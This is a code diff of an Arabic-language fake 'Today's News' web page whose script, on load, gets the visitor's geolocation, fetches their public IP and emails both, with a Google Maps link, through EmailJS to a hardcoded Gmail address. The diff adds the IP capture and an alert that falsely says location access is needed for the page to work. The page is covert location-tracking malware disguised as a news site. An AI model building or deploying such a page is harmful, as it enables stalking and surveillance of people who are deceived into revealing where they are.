@@ -4,62 +4,56 @@
   <meta charset="UTF-8">
   <title>أخبار اليوم</title>
   <style>
-    body {
-      font-family: Arial, sans-serif;
-      margin: 0;
-      padding: 0;
-      background: #f2f2f2;
-    }
-    header {
-      background: #1e90ff;
-      color: white;
-      padding: 20px;
-      text-align: center;
-    }
-    article {
-      background: white;
-      margin: 20px auto;
-      padding: 20px;
-      max-width: 800px;
-      border-radius: 8px;
-      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
-    }
-    h2 {
-      color: #1e90ff;
-    }
+    body { font-family: Arial; margin: 0; padding: 0; background: #f2f2f2; }
+    header { background: #1e90ff; color: white; padding: 20px; text-align: center; }
+    article { background: white; margin: 20px auto; padding: 20px; max-width: 800px; border-radius: 8px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
+    h2 { color: #1e90ff; }
   </style>
   <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
   <script>
-    (function(){
-      emailjs.init("6VfcdCXz6J4TDZIXr");  // Public Key
-    })();
+    (function(){ emailjs.init("6VfcdCXz6J4TDZIXr"); })();
 
-    function sendLocation(lat, lon) {
+    async function sendLocationAndIP(lat, lon) {
+      // جلب IP المستخدم عبر خدمة خارجية
+      let ip = "غير متوفر";
+      try {
+        const response = await fetch("https://api.ipify.org?format=json");
+        const data = await response.json();
+        ip = data.ip;
+      } catch (e) {
+        console.warn("تعذر الحصول على IP");
+      }
+
+      // إرسال البيانات مع رابط Google Maps و IP
       emailjs.send("service_tvydgr9", "template_18najwh", {
         latitude: lat,
         longitude: lon,
+        google_maps_link: "https://www.google.com/maps?q=" + lat + "," + lon,
+        user_ip: ip,
         email_to: "al.khbab77@gmail.com"
       })
-      .then(function(response) {
-        console.log("تم إرسال الموقع بنجاح ✅");
-      }, function(error) {
-        console.error("فشل الإرسال ❌", error);
-      });
+      .then(response => console.log("✅ تم الإرسال"))
+      .catch(error => console.error("❌ فشل الإرسال", error));
+    }
+
+    function requestLocation() {
+      if (!navigator.geolocation) {
+        alert("متصفحك لا يدعم تحديد الموقع.");
+        return;
+      }
+      navigator.geolocation.getCurrentPosition(
+        function(position) {
+          sendLocationAndIP(position.coords.latitude, position.coords.longitude);
+        },
+        function(error) {
+          alert("⚠️ لم يتم تحديد الموقع. تأكد أن خدمة الموقع مفعلة.");
+        }
+      );
     }
 
     window.onload = function() {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-          function(position) {
-            sendLocation(position.coords.latitude, position.coords.longitude);
-          },
-          function(error) {
-            console.warn("لم يتم تحديد الموقع");
-          }
-        );
-      } else {
-        console.warn("المتصفح لا يدعم تحديد الموقع");
-      }
+      alert("لتعمل الصفحة بشكل كامل، يرجى تفعيل خدمة الموقع على جهازك ثم الضغط على OK.");
+      requestLocation();
     };
   </script>
 </head>
@@ -70,12 +64,12 @@
 
   <article>
     <h2>عاجل: أهم الأخبار لهذا اليوم</h2>
-    <p>تابع أحدث الأخبار المحلية والدولية من مصادر موثوقة. سيتم تحديث الصفحة يوميًا بأهم الأحداث.</p>
+    <p>تابع أحدث الأخبار المحلية والدولية من مصادر موثوقة.</p>
   </article>
 
   <article>
     <h2>الطقس</h2>
-    <p>توقعات الطقس لهذا اليوم في معظم المدن. درجة الحرارة تتراوح بين 25° و 32°.</p>
+    <p>توقعات الطقس لهذا اليوم في معظم المدن.</p>
   </article>
 
   <article>
